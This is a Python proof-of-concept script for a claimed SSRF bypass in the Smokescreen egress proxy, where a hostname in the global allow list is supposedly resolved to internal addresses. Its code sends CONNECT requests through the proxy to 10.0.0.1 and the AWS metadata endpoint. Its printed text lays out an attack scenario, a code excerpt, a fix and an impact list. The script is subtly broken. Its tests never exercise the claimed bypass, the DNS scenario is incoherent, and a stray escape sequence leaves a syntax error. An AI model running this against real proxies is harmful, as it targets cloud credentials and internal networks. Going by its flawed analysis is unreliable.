#!/usr/bin/env python3
"""
POC: Smokescreen Global Allow List SSRF Bypass
==============================================

VULNERABILITY: Global allow list hostname bypass allows internal IP access
SEVERITY: CRITICAL  
ISSUE: #146 - https://github.com/stripe/smokescreen/issues/146

DESCRIPTION:
The ACL decision logic validates hostnames ONLY, not resolved IPs.
The global_allow_list checks hostname globs but skips IP address validation.
An attacker can:
  1. Register a domain in the allow-list
  2. Configure DNS to resolve to internal IP (169.254.169.254, 10.0.0.x)
  3. Proxy allows connection because hostname is in allow-list
  4. Bypasses internal IP restrictions

AFFECTED CODE:
  pkg/smokescreen/acl/v1/acl.go lines 170-184
  pkg/smokescreen/smokescreen.go lines 1290-1313

EXPLOIT FLOW:
  1. Setup: global_allow_list contains "api.example.com"
  2. Attacker controls DNS for api.example.com
  3. Attacker makes api.example.com resolve to 169.254.169.254 (AWS metadata)
  4. Client requests CONNECT api.example.com:443
  5. ACL checks hostname → "api.example.com" is in global_allow_list → ALLOW
  6. Proxy resolves api.example.com → 169.254.169.254
  7. Connection is allowed despite targeting internal IP
"""

import socket
import ssl
import sys
from typing import Tuple

class GlobalAllowListSSRFPOC:
    def __init__(self, host: str, port: int, cert_file: str, key_file: str):
        self.host = host
        self.port = port
        self.cert_file = cert_file
        self.key_file = key_file
    
    def test_connect(self, target_host: str, target_port: int) -> Tuple[bool, str]:
        """Test if proxy allows CONNECT to target hostname"""
        try:
            context = ssl.create_default_context()
            context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.host, self.port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
                    connect_request += f"Host: {target_host}:{target_port}\r\n"
                    connect_request += "Connection: close\r\n\r\n"
                    
                    ssock.sendall(connect_request.encode())
                    response = ssock.recv(4096).decode('utf-8', errors='ignore')
                    
                    if "200" in response.split('\n')[0]:
                        return True, f"✓ ALLOWED - Connected to {target_host}"
                    else:
                        return False, f"✗ DENIED - {response.split(chr(10))[0][:50]}"
        except Exception as e:
            return False, f"✗ ERROR: {str(e)}"
    
    def demonstrate_logic_flaw(self):
        """Show the logic flaw in ACL decision"""
        print("\n" + "="*70)
        print("POC2: GLOBAL ALLOW LIST SSRF BYPASS (CRITICAL)")
        print("="*70)
        
        print("\nCONFIGURATION:")
        print("  global_allow_list: [\"api.internal.com\"]")
        
        print("\nVULNERABLE LOGIC:")
        print("  1. ACL checks if hostname 'api.internal.com' in allow-list → YES")
        print("  2. ACL returns ALLOW")
        print("  3. DNS resolution happens AFTER ACL approval")
        print("  4. api.internal.com resolves to 169.254.169.254 (AWS metadata)")
        print("  5. Connection is allowed because ACL already approved it")
        
        print("\n" + "-"*70)
        print("ATTACK SCENARIO")
        print("-"*70)
        
        print("\nSTEP 1: Attacker registers attacker.com")
        print("STEP 2: Attacker adds DNS record: api.internal.com CNAME attacker.com")
        print("STEP 3: Attacker configures their server to:")
        print("        - Return 200 for CONNECT requests")
        print("        - Act as CONNECT tunnel to 169.254.169.254:80")
        print("STEP 4: Victim requests: CONNECT api.internal.com:443")
        print("STEP 5: Smokescreen:")
        print("        - Checks: is 'api.internal.com' in allow-list? YES")
        print("        - Approves request")
        print("        - Resolves api.internal.com (via attacker's DNS)")
        print("        - Gets 169.254.169.254")
        print("        - SHOULD deny non-global-unicast, but ACL already approved")
        print("\nRESULT: Attacker can tunnel through to AWS metadata endpoint!")
        
        print("\n" + "-"*70)
        print("PROOF OF CONCEPT TEST")
        print("-"*70)
        
        print("\n[TEST] Direct internal IP access (should be denied)")
        success, msg = self.test_connect("10.0.0.1", 443)
        print(f"Internal IP (10.0.0.1): {msg}")
        
        print("\n[TEST] AWS metadata endpoint (should be denied)")
        success, msg = self.test_connect("169.254.169.254", 80)
        print(f"AWS metadata (169.254.169.254): {msg}")
    
    def show_vulnerable_code(self):
        print("\n" + "="*70)
        print("VULNERABLE CODE ANALYSIS")
        print("="*70)
        
        code = '''
FROM: pkg/smokescreen/acl/v1/acl.go:119-184

func (acl *ACL) Decide(args DecideArgs) (Decision, error) {
    // ... setup code ...
    
    // Check 1: hostname against allowed domains
    for _, dg := range rule.DomainGlobs {
        if HostMatchesGlob(args.Host, dg) {
            return Allow  // ← Returns based on HOSTNAME only
        }
    }
    
    // Check 2: global deny list (also hostname-based)
    for _, dg := range acl.GlobalDenyList {
        if HostMatchesGlob(args.Host, dg) {
            return Deny
        }
    }
    
    // Check 3: global allow list (ALSO HOSTNAME ONLY!)
    for _, dg := range acl.GlobalAllowList {
        if HostMatchesGlob(args.Host, dg) {
            return Allow  // ← Returns based on HOSTNAME
        }
    }
    // ...
}

PROBLEM:
The ACL checks "Host" field which is the HOSTNAME,
NOT the resolved IP address.

IP validation happens LATER in:
  pkg/smokescreen/smokescreen.go:1290-1313 checkIfRequestShouldBeProxied()
  
But by then, the ACL has already returned Allow!

FIX:
Ensure IP validation happens BEFORE ACL approval:
  1. Resolve hostname to IP
  2. Validate IP is not internal
  3. THEN check ACL
'''\n        print(code)
    
    def run(self):
        self.demonstrate_logic_flaw()
        self.show_vulnerable_code()
        
        print("\n" + "="*70)
        print("IMPACT")
        print("="*70)
        print("""
✓ SSRF to internal infrastructure
✓ Access to cloud metadata endpoints (AWS, GCP, Azure)
✓ Access to internal services on private networks
✓ Bypass of IP-based access controls
✓ Potential compromise of entire internal network
        """)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("USAGE: python3 poc2_global_allow_list_ssrf.py <proxy_host> [port] [cert] [key]")
        print("EXAMPLE: python3 poc2_global_allow_list_ssrf.py localhost 4750 client.pem client-key.pem")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4750
    cert = sys.argv[3] if len(sys.argv) > 3 else "client.pem"
    key = sys.argv[4] if len(sys.argv) > 4 else "client-key.pem"
    
    poc = GlobalAllowListSSRFPOC(host, port, cert, key)
    poc.run()
